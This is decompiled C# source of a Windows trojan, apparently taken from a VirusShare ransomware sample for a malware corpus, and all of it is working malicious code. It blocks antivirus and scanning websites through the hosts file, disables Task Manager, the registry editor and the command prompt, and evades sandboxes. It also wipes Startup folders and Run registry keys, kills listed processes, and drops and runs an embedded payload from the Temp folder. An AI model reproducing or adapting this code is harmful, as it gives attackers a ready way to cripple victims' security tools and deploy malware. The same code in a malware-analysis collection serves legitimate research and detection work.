// Decompiled with JetBrains decompiler
// Type: yKrZ4Gyapk
// Assembly: iwinup, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70850B6B-65B2-4643-9F0D-B49BDD5ED5A3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.jfwt-c2c62f3d6ca106ec113f6a292f2b08377c82f608f95e3ce617a1777cfe4d9cea.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

[StandardModule]
public sealed class yKrZ4Gyapk
{
  [STAThread]
  public static void main()
  {
label_0:
    int num1;
    int num2;
    try
    {
      int num3 = 1;
      string[] strArray1 = Strings.Split(File.ReadAllText(Application.ExecutablePath), "/1337h3ck/");
label_1:
      num3 = 2;
      string[] strArray2 = Strings.Split(File.ReadAllText(Application.ExecutablePath), "/irunxbl/");
label_2:
      ProjectData.ClearProjectError();
      num1 = 1;
label_3:
      num3 = 4;
      if (!Conversions.ToBoolean(strArray1[2]))
        goto label_5;
label_4:
      num3 = 5;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.virustotal.com");
label_5:
      num3 = 7;
      if (!Conversions.ToBoolean(strArray1[3]))
        goto label_7;
label_6:
      num3 = 8;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.google.com");
label_7:
      num3 = 10;
      if (!Conversions.ToBoolean(strArray1[4]))
        goto label_9;
label_8:
      num3 = 11;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.novirusthanks.org");
label_9:
      num3 = 13;
      if (!Conversions.ToBoolean(strArray1[5]))
        goto label_11;
label_10:
      num3 = 14;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.kaspersky.com");
label_11:
      num3 = 16;
      if (!Conversions.ToBoolean(strArray1[6]))
        goto label_13;
label_12:
      num3 = 17;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.malwarebytes.org");
label_13:
      num3 = 19;
      if (!Conversions.ToBoolean(strArray1[7]))
        goto label_15;
label_14:
      num3 = 20;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.clamav.net");
label_15:
      num3 = 22;
      if (!Conversions.ToBoolean(strArray1[8]))
        goto label_17;
label_16:
      num3 = 23;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.yahoo.com");
label_17:
      num3 = 25;
      if (!Conversions.ToBoolean(strArray1[9]))
        goto label_19;
label_18:
      num3 = 26;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.virusscan.jotti.org");
label_19:
      num3 = 28;
      if (!Conversions.ToBoolean(strArray1[10]))
        goto label_21;
label_20:
      num3 = 29;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.download.com");
label_21:
      num3 = 31;
      if (!Conversions.ToBoolean(strArray1[11]))
        goto label_23;
label_22:
      num3 = 32;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.avg.com");
label_23:
      num3 = 34;
      if (!Conversions.ToBoolean(strArray1[12]))
        goto label_25;
label_24:
      num3 = 35;
      yKrZ4Gyapk.yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk("www.eset.com");
label_25:
      num3 = 37;
      if (!Conversions.ToBoolean(strArray1[13]))
        goto label_27;
label_26:
      num3 = 38;
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "DisableRegistryTools", (object) "1", RegistryValueKind.DWord);
label_27:
      num3 = 40;
      if (!Conversions.ToBoolean(strArray1[14]))
        goto label_29;
label_28:
      num3 = 41;
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", (object) "1", RegistryValueKind.DWord);
label_29:
      num3 = 43;
      if (!Conversions.ToBoolean(strArray1[15]))
        goto label_31;
label_30:
      num3 = 44;
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.Hide);
label_31:
      num3 = 46;
      if (!Conversions.ToBoolean(strArray1[16]))
        goto label_34;
label_32:
      num3 = 47;
      if (!Process.GetCurrentProcess().MainModule.FileName.Contains("sample"))
        goto label_34;
label_33:
      num3 = 48;
      Environment.Exit(0);
label_34:
      num3 = 51;
      if (!Conversions.ToBoolean(strArray1[17]))
        goto label_37;
label_35:
      num3 = 52;
      if (!Process.GetCurrentProcess().MainModule.FileName.Contains("#"))
        goto label_37;
label_36:
      num3 = 53;
      Environment.Exit(0);
label_37:
      num3 = 56;
      if (!Conversions.ToBoolean(strArray1[18]))
        goto label_40;
label_38:
      num3 = 57;
      if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
        goto label_40;
label_39:
      num3 = 58;
      yKrZ4Gyapk.yKrZ4Gyapkaa(new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup)));
label_40:
      num3 = 61;
      if (!Conversions.ToBoolean(strArray1[20]))
        goto label_45;
label_41:
      num3 = 62;
      MyProject.Computer.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", true).DeleteSubKeyTree("Run");
label_42:
      num3 = 63;
      MyProject.Computer.Registry.LocalMachine.Close();
label_43:
      num3 = 64;
      MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion", true).DeleteSubKeyTree("Run");
label_44:
      num3 = 65;
      MyProject.Computer.Registry.LocalMachine.Close();
label_45:
      num3 = 67;
      if (!Conversions.ToBoolean(strArray1[19]))
        goto label_48;
label_46:
      num3 = 68;
      MyProject.Computer.Registry.LocalMachine.OpenSubKey("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup", true).DeleteSubKeyTree("Installed Components");
label_47:
      num3 = 69;
      MyProject.Computer.Registry.LocalMachine.Close();
label_48:
      num3 = 71;
      int integer = Conversions.ToInteger(strArray1[21]);
      int index1 = 1;
      goto label_57;
label_49:
      num3 = 72;
      if (Process.GetProcessesByName(strArray2[index1]).Length < 1)
        goto label_56;
label_50:
      num3 = 73;
      Process[] processesByName = Process.GetProcessesByName(strArray2[index1]);
label_51:
      num3 = 74;
      Process[] processArray = processesByName;
      int index2 = 0;
      goto label_55;
label_53:
      num3 = 75;
      Process process;
      process.Kill();
      checked { ++index2; }
label_54:
      num3 = 76;
label_55:
      if (index2 < processArray.Length)
      {
        process = processArray[index2];
        goto label_53;
      }
label_56:
      num3 = 78;
      checked { ++index1; }
label_57:
      if (index1 <= integer)
        goto label_49;
label_58:
      num3 = 79;
      MyProject.Computer.FileSystem.WriteAllText(Path.GetTempPath() + "msconfigs.exe", strArray1[1], true);
label_59:
      num3 = 80;
      if (!MyProject.Computer.FileSystem.FileExists(Path.GetTempPath() + "msconfigs.exe"))
        goto label_61;
label_60:
      num3 = 81;
      MyProject.Computer.FileSystem.DeleteFile(Path.GetTempPath() + "msconfigs.exe");
label_61:
      num3 = 83;
      Process.Start(Path.GetTempPath() + "msconfigs.exe");
label_62:
      num3 = 84;
      FileSystem.FileOpen(1, Path.GetTempPath() + "msconfigs.exe", OpenMode.Binary);
label_63:
      num3 = 85;
      FileSystem.FilePut(1, strArray1[1], -1L, false);
label_64:
      num3 = 86;
      FileSystem.FileClose(1);
label_65:
      num3 = 87;
      Process.Start(Path.GetTempPath() + "msconfigs.exe");
      goto label_72;
label_67:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
            case 7:
              goto label_5;
            case 8:
              goto label_6;
            case 9:
            case 10:
              goto label_7;
            case 11:
              goto label_8;
            case 12:
            case 13:
              goto label_9;
            case 14:
              goto label_10;
            case 15:
            case 16:
              goto label_11;
            case 17:
              goto label_12;
            case 18:
            case 19:
              goto label_13;
            case 20:
              goto label_14;
            case 21:
            case 22:
              goto label_15;
            case 23:
              goto label_16;
            case 24:
            case 25:
              goto label_17;
            case 26:
              goto label_18;
            case 27:
            case 28:
              goto label_19;
            case 29:
              goto label_20;
            case 30:
            case 31:
              goto label_21;
            case 32:
              goto label_22;
            case 33:
            case 34:
              goto label_23;
            case 35:
              goto label_24;
            case 36:
            case 37:
              goto label_25;
            case 38:
              goto label_26;
            case 39:
            case 40:
              goto label_27;
            case 41:
              goto label_28;
            case 42:
            case 43:
              goto label_29;
            case 44:
              goto label_30;
            case 45:
            case 46:
              goto label_31;
            case 47:
              goto label_32;
            case 48:
              goto label_33;
            case 49:
            case 50:
            case 51:
              goto label_34;
            case 52:
              goto label_35;
            case 53:
              goto label_36;
            case 54:
            case 55:
            case 56:
              goto label_37;
            case 57:
              goto label_38;
            case 58:
              goto label_39;
            case 59:
            case 60:
            case 61:
              goto label_40;
            case 62:
              goto label_41;
            case 63:
              goto label_42;
            case 64:
              goto label_43;
            case 65:
              goto label_44;
            case 66:
            case 67:
              goto label_45;
            case 68:
              goto label_46;
            case 69:
              goto label_47;
            case 70:
            case 71:
              goto label_48;
            case 72:
              goto label_49;
            case 73:
              goto label_50;
            case 74:
              goto label_51;
            case 75:
              goto label_53;
            case 76:
              goto label_54;
            case 77:
            case 78:
              goto label_56;
            case 79:
              goto label_58;
            case 80:
              goto label_59;
            case 81:
              goto label_60;
            case 82:
            case 83:
              goto label_61;
            case 84:
              goto label_62;
            case 85:
              goto label_63;
            case 86:
              goto label_64;
            case 87:
              goto label_65;
            case 88:
              goto label_72;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_67;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_72:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static void yKrZ4Gyapkaa(DirectoryInfo dir)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      FileInfo[] files = dir.GetFiles();
label_2:
      num3 = 3;
      FileInfo[] fileInfoArray = files;
      int index1 = 0;
      goto label_6;
label_4:
      num3 = 4;
      FileInfo fileInfo;
      fileInfo.Delete();
      checked { ++index1; }
label_5:
      num3 = 5;
label_6:
      if (index1 < fileInfoArray.Length)
      {
        fileInfo = fileInfoArray[index1];
        goto label_4;
      }
label_7:
      num3 = 6;
      DirectoryInfo[] directories = dir.GetDirectories();
label_8:
      num3 = 7;
      DirectoryInfo[] directoryInfoArray = directories;
      int index2 = 0;
      goto label_12;
label_10:
      num3 = 8;
      DirectoryInfo dir1;
      yKrZ4Gyapk.yKrZ4Gyapkaa(dir1);
      checked { ++index2; }
label_11:
      num3 = 9;
label_12:
      if (index2 < directoryInfoArray.Length)
      {
        dir1 = directoryInfoArray[index2];
        goto label_10;
      }
      else
        goto label_19;
label_14:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_4;
            case 5:
              goto label_5;
            case 6:
              goto label_7;
            case 7:
              goto label_8;
            case 8:
              goto label_10;
            case 9:
              goto label_11;
            case 10:
              goto label_19;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_14;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_19:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public static object yKrZ4GyapkyKrZ4GyapkyKrZ4GyapkyKrZ4Gyapk(string yKrZ4Gyapkb)
  {
label_0:
    int num1;
    object obj1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      StreamWriter streamWriter = new StreamWriter("C:\\Windows\\System32\\drivers\\etc\\hosts", true);
label_2:
      num3 = 3;
      streamWriter.Write("\n 127.0.0.1 " + yKrZ4Gyapkb);
label_3:
      num3 = 4;
      streamWriter.Close();
label_4:
      num3 = 5;
      obj1 = (object) "hi";
      goto label_11;
label_6:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_11;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_6;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_11:
    object obj2 = obj1;
    if (num2 == 0)
      return obj2;
    ProjectData.ClearProjectError();
    return obj2;
  }
}
